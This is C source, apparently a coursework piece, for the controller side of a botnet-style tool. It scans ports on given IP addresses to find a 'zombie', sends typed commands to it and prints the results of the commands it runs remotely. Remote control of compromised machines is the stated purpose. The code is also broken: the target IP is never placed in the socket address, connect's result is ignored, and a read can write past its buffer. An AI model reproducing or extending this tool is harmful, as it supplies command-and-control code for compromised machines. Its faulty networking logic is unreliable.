#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <poll.h>

#define BUF_SIZE 1024
#define POLL_TIMEOUT 1000

#include "utils_v2.h"
#include "messages.h"

int createConnection(char *ip, int port) {
    int sock;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Erreur lors de la création du socket");
        return -1;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    return sock;
}

void envoyer_commandes(int sock) {
    char buffer[BUF_SIZE];

    while (1) {
        printf("Entrez votre commande a envoyer aux zombies: \n ");
        fgets(buffer, BUF_SIZE, stdin);

        ssize_t message_envoye = write(sock, buffer, strlen(buffer));
        if (message_envoye < 0) {
            printf("Error message_envoye\n");
            break;
        }
    }
}

void recevoir_commandes(int sock) {
    struct pollfd fds[1];
    fds[0].fd = sock;
    fds[0].events = POLLIN;

    char buffer[BUF_SIZE];

    while (1) {
        int res = poll(fds, 1, POLL_TIMEOUT);

        if (res < 0) {
            printf("error poll\n");
            break;
        } else if (res > 0) {
            if (fds[0].revents & POLLIN) {
                ssize_t message_recu = read(sock, buffer, BUF_SIZE);
                if (message_recu < 0) {
                    printf("Error message_recu\n");
                    break;
                }

                buffer[message_recu] = '\0';
                printf("Réponse de la commande exécutée  = \n%s", buffer);
            }
        }
    }
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("ip -> manquant\n");
        return 1;
    }

    char **ips = &argv[1];

    int sock = -1;
    int connectedPort = -1;

/*
    
    fixer le faite de se connecter 2 fois au zombie
*/
    for (int i = 0; ips[i] != NULL; i++) {
        for (int port = MIN_PORT; port <= MAX_PORT; port++) {
            sock = createConnection(ips[i], port);


            if (sock < 0) {
                continue;
            }

            struct sockaddr_in addr;
            socklen_t addr_len = sizeof(addr);
            getpeername(sock, (struct sockaddr *)&addr, &addr_len);
            connectedPort = ntohs(addr.sin_port);

            if (connectedPort != port) {
                close(sock);
                continue;
            }
            
            printf("Connexion établie avec %s:%d\n", ips[i], port);

            break;
        }

        if (sock >= 0) {
            break;
        }
    }
          

    pid_t send_pid = fork();

    if (send_pid == 0) {
        // FILS
        envoyer_commandes(sock);
        exit(0);
    } else if (send_pid > 0) {
        // PARENT

            recevoir_commandes(sock);
            
            int sender_status;
            swaitpid(send_pid, &sender_status, 0);

            if (WIFEXITED(sender_status) ) {
                printf("error dans l'envoi ou le recevoir_commandes\n");
            } else {
                printf("error processus\n");
            }

            close(sock);
            return 0;
        
    } else {
        perror("fork");
        return 1;
    }
    return 0;
}

    
